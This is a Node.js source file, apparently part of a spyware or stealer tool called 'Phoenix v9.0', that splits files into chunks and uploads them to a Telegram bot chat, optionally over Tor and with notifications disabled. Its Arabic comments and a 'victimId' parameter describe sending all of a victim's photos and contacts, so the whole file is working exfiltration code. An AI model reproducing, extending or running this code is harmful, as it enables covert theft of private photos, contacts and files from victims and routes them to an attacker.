// ===================================================================
// TELEGRAM SENDER WITH CHUNKING (Phoenix v9.0)
// ===================================================================
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { getTorAgent } = require('./tor-helper');

class TelegramSender {
    constructor(token, chatId, options = {}) {
        this.token = token;
        this.chatId = chatId;
        this.options = {
            chunkSize: 1.5 * 1024 * 1024 * 1024, // 1.5 جيجابايت لكل جزء (قابل للتعديل)
            maxFileSize: 2 * 1024 * 1024 * 1024, // 2 جيجابايت حد Telegram
            useTor: options.useTor || false,
            retries: 3,
            retryDelay: 5000,
            ...options
        };
        this.agent = this.options.useTor ? getTorAgent() : null;
    }

    // ================================================================
    // الوظيفة الرئيسية: إرسال ملف مع تقسيم تلقائي
    // ================================================================
    async sendFile(filePath, originalName, caption = '') {
        const stats = fs.statSync(filePath);
        const fileSize = stats.size;

        // إذا كان الملف صغيراً (< 1 جيجابايت)، أرسله كاملاً
        if (fileSize <= 1024 * 1024 * 1024) { // 1 جيجابايت
            return this.sendSingleFile(filePath, originalName, caption);
        }

        // تقسيم الملف الكبير
        console.log(`[+] File ${originalName} (${(fileSize / 1e9).toFixed(2)} GB) will be split into chunks.`);
        const chunks = this.splitFile(filePath, originalName);
        const totalChunks = chunks.length;

        // إرسال كل جزء
        const results = [];
        for (let i = 0; i < totalChunks; i++) {
            const chunk = chunks[i];
            const partCaption = `${caption} (Part ${i+1}/${totalChunks})`;
            const result = await this.sendSingleFile(
                chunk.tempPath,
                chunk.name,
                partCaption
            );
            results.push(result);

            // حذف الملف المؤقت بعد الإرسال (لتوفير المساحة)
            fs.unlinkSync(chunk.tempPath);

            // تأخير بسيط بين الأجزاء لتجنب حد المعدل (Rate Limit) في Telegram
            if (i < totalChunks - 1) {
                await new Promise(r => setTimeout(r, 1000));
            }
        }

        return {
            success: true,
            totalChunks,
            results,
            originalName,
            totalSize: fileSize
        };
    }

    // ================================================================
    // تقسيم الملف الكبير إلى أجزاء
    // ================================================================
    splitFile(filePath, originalName) {
        const stats = fs.statSync(filePath);
        const fileSize = stats.size;
        const chunkSize = this.options.chunkSize;
        const chunks = [];

        // حساب عدد الأجزاء (على الأقل 2، كحد أقصى 3 أجزاء حسب طلبك)
        let numChunks = Math.ceil(fileSize / chunkSize);
        if (numChunks < 2) numChunks = 2; // على الأقل جزأين للملفات الكبيرة
        if (numChunks > 3) numChunks = 3; // كحد أقصى 3 أجزاء

        // إعادة حساب حجم كل جزء بالتساوي
        const actualChunkSize = Math.ceil(fileSize / numChunks);

        const tempDir = path.join(__dirname, 'temp_chunks');
        if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

        for (let i = 0; i < numChunks; i++) {
            const start = i * actualChunkSize;
            const end = Math.min(start + actualChunkSize, fileSize);
            const chunkSizeActual = end - start;

            const chunkName = `${path.basename(originalName)}.part${i+1}.bin`;
            const tempPath = path.join(tempDir, `chunk_${Date.now()}_${i}.bin`);

            // قراءة الجزء من الملف الأصلي
            const buffer = Buffer.alloc(chunkSizeActual);
            const fd = fs.openSync(filePath, 'r');
            fs.readSync(fd, buffer, 0, chunkSizeActual, start);
            fs.closeSync(fd);

            // حفظ الجزء في ملف مؤقت
            fs.writeFileSync(tempPath, buffer);

            chunks.push({
                tempPath,
                name: chunkName,
                start,
                end,
                size: chunkSizeActual
            });
        }

        return chunks;
    }

    // ================================================================
    // إرسال ملف واحد (دون تقسيم)
    // ================================================================
    async sendSingleFile(filePath, fileName, caption = '') {
        const url = `https://api.telegram.org/bot${this.token}/sendDocument`;
        const form = new FormData();
        form.append('chat_id', this.chatId);
        form.append('document', fs.createReadStream(filePath), {
            filename: fileName,
            contentType: 'application/octet-stream'
        });
        form.append('caption', caption.slice(0, 1000));

        // إضافة خيارات إضافية لتجنب الحظر
        form.append('disable_notification', 'true');

        let attempt = 0;
        while (attempt < this.options.retries) {
            try {
                const response = await axios.post(url, form, {
                    headers: form.getHeaders(),
                    httpsAgent: this.agent,
                    maxContentLength: Infinity,
                    maxBodyLength: Infinity,
                });
                console.log(`[+] Sent ${fileName} (${(fs.statSync(filePath).size / 1e6).toFixed(2)} MB)`);
                return response.data;
            } catch (error) {
                attempt++;
                console.warn(`[!] Telegram send failed (attempt ${attempt}/${this.options.retries}): ${error.message}`);
                if (attempt >= this.options.retries) {
                    throw new Error(`Failed to send ${fileName} after ${this.options.retries} attempts: ${error.message}`);
                }
                await new Promise(r => setTimeout(r, this.options.retryDelay));
            }
        }
    }

    // ================================================================
    // إرسال نص (للمعلومات الوصفية وجهات الاتصال)
    // ================================================================
    async sendText(text, caption = '') {
        const url = `https://api.telegram.org/bot${this.token}/sendMessage`;
        const payload = {
            chat_id: this.chatId,
            text: caption + '\n\n' + text.slice(0, 4096),
            disable_notification: true
        };

        try {
            const response = await axios.post(url, payload, {
                httpsAgent: this.agent
            });
            console.log(`[+] Sent text (${text.length} chars)`);
            return response.data;
        } catch (error) {
            console.error('[!] Failed to send text:', error.message);
            throw error;
        }
    }

    // ================================================================
    // إرسال مجموعة من الملفات (مثل كل صور الضحية) مع تحديد حجم كل منها
    // ================================================================
    async sendDirectory(victimId, dirPath, caption = '') {
        const files = fs.readdirSync(dirPath);
        const results = [];

        for (const file of files) {
            const fullPath = path.join(dirPath, file);
            if (fs.statSync(fullPath).isFile()) {
                const result = await this.sendFile(
                    fullPath,
                    `${victimId}_${file}`,
                    caption
                );
                results.push(result);
            }
        }

        return results;
    }

    // ================================================================
    // أداة مساعدة: حساب حجم الملف وإرجاع اقتراح للتقسيم
    // ================================================================
    static getChunkingSuggestion(fileSize) {
        if (fileSize <= 1024 * 1024 * 1024) { // <= 1 GB
            return { shouldChunk: false, chunks: 1 };
        } else if (fileSize <= 2 * 1024 * 1024 * 1024) { // <= 2 GB
            return { shouldChunk: true, chunks: 2 };
        } else {
            return { shouldChunk: true, chunks: 3 };
        }
    }
}

module.exports = TelegramSender;
